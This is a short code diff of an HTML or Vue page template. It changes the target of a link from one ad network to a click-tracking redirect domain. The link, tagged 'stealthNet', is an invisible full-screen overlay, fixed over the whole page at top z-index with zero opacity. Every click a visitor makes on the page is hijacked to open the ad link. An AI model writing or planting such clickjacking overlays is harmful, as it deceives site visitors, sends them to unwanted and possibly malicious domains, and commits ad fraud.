@@ -2,7 +2,7 @@
   <div class="home-b">
 <!--    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>-->
     <img src="../assets/adsimg/a.png" style="margin: 0 auto;" alt="">
-    <a href="https://www.profitablecpmratenetwork.com/eet0d835?key=edd631eedc507862650ff626c430b6da"
+    <a href="https://h4imw.bemobtrcks.com/click"
        target="_blank"
        ref="stealthNet"
        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;"
